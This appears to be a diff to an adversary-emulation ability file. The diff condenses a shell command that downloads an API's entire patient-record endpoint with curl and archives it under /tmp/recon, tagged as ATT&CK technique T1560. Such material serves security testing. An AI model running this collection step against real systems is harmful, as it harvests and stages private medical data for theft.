@@ -9,22 +9,4 @@
     linux:
       sh:
         command: |
-          OUTDIR="/tmp/recon"
-          API_BASE="#{api.scheme}://#{api.host}:#{api.port}"
-          mkdir -p "${OUTDIR}"
-          TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-          RAW_FILE="${OUTDIR}/db_raw_${TIMESTAMP}.json"
-          ARCHIVE="${OUTDIR}/db_dump_${TIMESTAMP}.tar.gz"
-          CODE=$(curl -s -o "${RAW_FILE}" -w "%{http_code}" --connect-timeout 5 --max-time 30 "${API_BASE}/patients")
-          if [ "${CODE}" = "000" ]; then
-            echo "ERROR: API unreachable at ${API_BASE}"
-            exit 1
-          elif [ "${CODE}" -ge 400 ]; then
-            echo "ERROR: API returned HTTP ${CODE}"
-            cat "${RAW_FILE}"
-            exit 1
-          fi
-          # Crea un archivio compresso (realizza T1560)
-          tar czf "${ARCHIVE}" -C "${OUTDIR}" "db_raw_${TIMESTAMP}.json"
-          echo "Dump saved to ${ARCHIVE} (HTTP ${CODE})"
-          ls -lh "${OUTDIR}/"
+          OUTDIR="/tmp/recon"; API_BASE="#{api.scheme}://#{api.host}:#{api.port}"; mkdir -p "$OUTDIR"; TS=$(date +%Y%m%d_%H%M%S); RAW="$OUTDIR/db_raw_$TS.json"; CODE=$(curl -s -L -w "%{http_code}" -o "$RAW" --connect-timeout 10 "$API_BASE/patients/"); if [ "$CODE" != "200" ]; then echo "Error HTTP $CODE" >&2; exit 1; fi; tar czf "$OUTDIR/db_dump_$TS.tar.gz" -C "$OUTDIR" "db_raw_$TS.json" && echo "Dump successful: $OUTDIR/db_dump_$TS.tar.gz"
